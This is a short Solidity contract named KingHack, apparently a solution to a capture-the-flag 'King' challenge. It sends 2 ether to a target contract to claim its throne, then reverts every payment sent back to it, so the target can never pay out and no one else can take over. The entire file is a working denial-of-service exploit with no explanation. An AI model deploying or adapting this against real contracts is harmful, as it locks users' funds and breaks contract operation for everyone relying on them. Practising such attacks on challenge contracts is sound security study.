// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

contract KingHack {
    address payable _target;

    constructor(address target) payable {
        _target = payable(target);
    }

    function attack() external {
        (bool success, ) = _target.call{value: 2 ether}("");
        require(success, "attack failed");
    }

    receive() external payable {
        revert("Sucka!");
    }
}
